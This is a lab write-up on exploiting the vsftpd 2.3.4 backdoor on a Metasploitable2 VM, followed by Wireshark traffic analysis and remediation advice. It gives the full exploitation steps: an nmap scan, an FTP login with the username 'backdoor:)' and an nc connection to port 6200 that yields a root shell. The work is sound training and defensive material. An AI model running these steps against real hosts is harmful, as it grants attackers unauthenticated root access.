# Metasploitable2 — vsftpd 2.3.4 Backdoor Exploitation & Traffic Analysis

## Objective
Identify and exploit a known backdoor vulnerability in a deliberately vulnerable target VM, then analyze the resulting network traffic to understand the real-world footprint of the attack.

## Environment
- **Attacker machine:** Kali Linux (VirtualBox, Internal Network)
- **Target machine:** Metasploitable2 (VirtualBox, Internal Network)
- **Network:** Isolated internal lab network (192.168.56.0/24), no internet exposure
- **Tools used:** Nmap, netcat, Wireshark, FTP client

## 1. Reconnaissance — Service Enumeration

Ran a version-detection scan against the target to enumerate open ports and running services:

```
nmap -sV -Pn 192.168.56.20
```

**Results:**

| Port | State | Service | Version |
|---|---|---|---|
| 21/tcp | open | ftp | **vsftpd 2.3.4** |
| 22/tcp | open | ssh | OpenSSH 4.7p1 Debian 8ubuntu1 |
| 23/tcp | open | telnet | Linux telnetd |
| 25/tcp | open | smtp | Postfix smtpd |
| 53/tcp | open | domain | ISC BIND 9.4.2 |
| 80/tcp | open | http | Apache httpd 2.2.8 |
| 111/tcp | open | rpcbind | 2 (RPC #100000) |
| 139,445/tcp | open | netbios-ssn | Samba smbd 3.X |
| 512-514/tcp | open | exec/login/shell | r-services |
| 1524/tcp | open | bindshell | "Metasploitable root shell" |
| 3306/tcp | open | mysql | MySQL 5.0.51a |
| 5432/tcp | open | postgresql | PostgreSQL DB 8.3.0 |
| 6667/tcp | open | irc | UnrealIRCd |

**Finding:** `vsftpd 2.3.4` on port 21 immediately stood out — this specific version is known to contain a backdoor (CVE-2011-2523), intentionally injected into the source code of a compromised download mirror in 2011.

## 2. Exploitation — Triggering the Backdoor

The vsftpd 2.3.4 backdoor is triggered by including a smiley face (`:)`) in the FTP username. This causes the service to spawn a listener on **TCP port 6200**, bound to `/bin/sh` with no authentication required.

```
ftp 192.168.56.20
Name: backdoor:)
Password: [anything]
```

The FTP login itself fails ("530 Login incorrect") — this is expected and irrelevant; the trigger fires regardless of login outcome.

**Verification:**
```
nmap -p 6200 192.168.56.20
```
Port 6200 showed as **open**, confirming the backdoor had fired.

**Gaining access:**
```
nc 192.168.56.20 6200
whoami
```
Output: `root`

Full, unauthenticated root access was obtained with no exploit code — only a malformed FTP username.

## 3. Traffic Analysis (Wireshark)

A packet capture was taken on the Kali interface spanning both the FTP login and the subsequent port 6200 connection.

**TCP Handshake (port 6200):**
```
192.168.56.10 → 192.168.56.20   SYN
192.168.56.20 → 192.168.56.10   SYN, ACK
192.168.56.10 → 192.168.56.20   ACK
```
Standard 3-way handshake, confirming a stateful TCP session was established before any shell interaction occurred.

**Post-handshake traffic:**
The session consisted of many small `PSH, ACK` packets, most carrying a single byte of payload — consistent with an unbuffered, non-PTY shell where each keystroke is transmitted as an individual packet.

**Stream reconstruction (Follow TCP Stream):**
Reassembling the full TCP stream revealed the entire interactive session — commands typed and command output returned — in **plaintext**. Both the FTP login attempt (`USER backdoor:)`) and the subsequent root shell session (`whoami` → `root`) were fully readable with no encryption whatsoever.

## Key Findings

1. **Version disclosure is a critical risk on its own.** A simple, passive banner grab (`nmap -sV`) was sufficient to identify a critical vulnerability — no active exploitation was needed to spot the risk.
2. **The backdoor required no exploit tooling.** A single crafted string (`backdoor:)`) was the entire "exploit" — illustrating how low the bar can be for severe compromise when known-vulnerable software is left in place.
3. **All traffic was unencrypted and fully reconstructable.** Both the triggering FTP session and the resulting root shell were visible in cleartext via Wireshark's TCP stream reconstruction — demonstrating the forensic value of packet capture during an incident, and the real-world risk of unencrypted administrative protocols.

## Remediation
- Patch/upgrade vsftpd to a version beyond 2.3.4, or verify binary integrity against official checksums when installing from third-party mirrors.
- Disable or restrict FTP in favor of encrypted alternatives (SFTP/FTPS).
- Monitor for unexpected listeners on non-standard ports (e.g. 6200) as a detection control.
- Implement network segmentation and egress filtering to limit the blast radius of a compromised host.

---
*Performed in an isolated, offline lab environment for educational purposes as part of a 30-day SOC L1/L2 analyst preparation plan.*
